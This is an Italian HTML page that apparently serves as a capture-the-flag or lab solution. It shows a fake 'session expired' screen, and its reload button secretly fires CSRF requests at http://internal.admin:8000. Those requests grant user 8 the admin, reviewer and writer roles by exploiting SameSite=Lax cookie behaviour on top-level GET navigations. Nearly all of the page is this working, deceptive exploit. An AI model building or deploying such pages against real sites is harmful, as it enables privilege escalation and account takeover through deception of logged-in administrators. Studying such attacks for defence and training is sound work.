<!doctype html>
<html lang="it">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cyber Blog · Demo sessione</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      background: #f3f5f9;
      color: #182235;
      font: 1rem/1.5 system-ui, sans-serif;
    }

    main {
      box-sizing: border-box;
      width: min(28rem, calc(100% - 2rem));
      padding: 2rem;
      border: 1px solid #dbe0e8;
      border-radius: 1rem;
      background: white;
    }

    h1 { margin: 0.5rem 0; }
    .label { color: #526078; font-size: 0.875rem; }

    a {
      display: inline-block;
      margin-top: 0.75rem;
      padding: 0.65rem 1rem;
      border-radius: 0.5rem;
      background: #214fc6;
      color: white;
      text-decoration: none;
    }

    #dashboard { display: none; }
    #dashboard:target { display: block; }
    #dashboard:target ~ #sessione { display: none; }
  </style>
</head>
<body>
  <main>
    <section id="dashboard">
      <span class="label">Cyber Blog</span>
      <h1>Dashboard</h1>
      <p>La schermata è stata ricaricata.</p>
      <a href="#sessione">Ripeti la demo</a>
    </section>

    <section id="sessione">
      <span class="label">Cyber Blog</span>
      <h1>Sessione scaduta</h1>
      <p>Ricarica la pagina per tornare alla dashboard.</p>
      <a id="reload-link" href="http://internal.admin:8000/">Ricarica la pagina</a>
    </section>
  </main>

  <script>
    function fire(url) {
      var win = window.open(url, "_blank");
      if (win) {
        setTimeout(function() {
          win.close();
        }, 100);
      }
    }

    function triggerCsrf() {
      // Utente 8: assegnazione dei tre ruoli, navigazioni top-level GET
      // (SameSite=Lax consente l'invio dei cookie di sessione solo in questo caso)
      fire("http://internal.admin:8000/admin/8/set-admin");
      setTimeout(function() {
        fire("http://internal.admin:8000/admin/8/set-revisor");
      }, 500);
      setTimeout(function() {
        fire("http://internal.admin:8000/admin/8/set-writer");
      }, 1000);
    }

    // Al click su "Ricarica la pagina": le richieste CSRF e la navigazione normale
    document.getElementById("reload-link").addEventListener("click", function() {
      triggerCsrf();
    });
  </script>
</body>
</html>
